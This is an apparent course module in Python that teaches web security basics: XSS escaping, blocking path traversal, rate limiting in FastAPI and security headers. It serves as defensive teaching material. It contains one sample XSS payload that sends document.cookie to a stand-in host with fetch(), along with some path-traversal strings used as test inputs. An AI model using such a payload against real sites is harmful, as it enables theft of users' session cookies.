"""Module 24 · A web security checklist you can run (OWASP Top 10 basics)

  1. Injection          -> parameters / ORM, never string-built SQL      (Module 18, 23)
  2. XSS                -> escape output; templates do it by default      (Module 21)
  3. Broken access      -> check WHO is asking on every endpoint (401 vs 403)
  4. Path traversal     -> never join user input into file paths blindly
  5. Brute force        -> rate limiting (429 Too Many Requests)
  6. Security headers   -> tell browsers to be strict
  7. Secrets            -> env vars / Key Vault, never in git
  8. Vulnerable deps    -> `pip-audit` checks your packages for known CVEs
  9. CSRF               -> cookies are sent automatically by browsers; use SameSite
                           cookies + CSRF tokens for cookie-based forms. Bearer tokens
                           in headers aren't sent automatically, so they're not affected.

Run it:  python 24_auth_security/04_web_security_checklist.py
"""
import time
from collections import defaultdict, deque
from pathlib import Path
from typing import Annotated

from fastapi import Depends, FastAPI, HTTPException, Request
from markupsafe import escape

# --- 2. XSS: escape anything user-controlled before it goes into HTML --------------------------------
comment = '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">'
print("escaped:", escape(comment)[:60], "...")

# --- 4. Path traversal ---------------------------------------------------------------------------------
UPLOADS = Path("uploads").resolve()


def safe_path(filename: str) -> Path:
    target = (UPLOADS / filename).resolve()
    if not target.is_relative_to(UPLOADS):          # "../../etc/passwd" escapes the folder
        raise PermissionError(f"blocked: {filename}")
    return target


for name in ["report.pdf", "../../windows/win.ini"]:
    try:
        print("allowed:", safe_path(name).name)
    except PermissionError as e:
        print(e)

# --- 5 + 6. Rate limiting and security headers in FastAPI ---------------------------------------------------
app = FastAPI()
HITS: dict[str, deque] = defaultdict(deque)


def rate_limit(request: Request, limit: int = 5, window: float = 60.0) -> None:
    """Sliding window: at most `limit` requests per `window` seconds per client IP.
    (Use Redis for this when you run several server processes.)"""
    now, hits = time.monotonic(), HITS[request.client.host]
    while hits and now - hits[0] > window:
        hits.popleft()
    if len(hits) >= limit:
        raise HTTPException(429, "too many attempts, try again later",
                            headers={"Retry-After": str(int(window - (now - hits[0])))})
    hits.append(now)


@app.middleware("http")
async def security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"                       # no clickjacking in iframes
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Content-Security-Policy"] = "default-src 'self'"  # blocks injected scripts
    response.headers["Strict-Transport-Security"] = "max-age=31536000"  # HTTPS only
    return response


@app.post("/login")
def login(_: Annotated[None, Depends(rate_limit)]) -> dict:
    return {"ok": True}


if __name__ == "__main__":
    import warnings
    warnings.filterwarnings("ignore", message=".*httpx.*")
    from fastapi.testclient import TestClient

    c = TestClient(app)
    codes = [c.post("/login").status_code for _ in range(7)]
    print("\n7 login attempts:", codes)                           # 5x 200, then 429
    r = c.post("/login")
    print("Retry-After:", r.headers["Retry-After"], "seconds")
    print("CSP header: ", r.headers["Content-Security-Policy"])
    print("\nCheck your dependencies for known vulnerabilities:  pip install pip-audit && pip-audit")
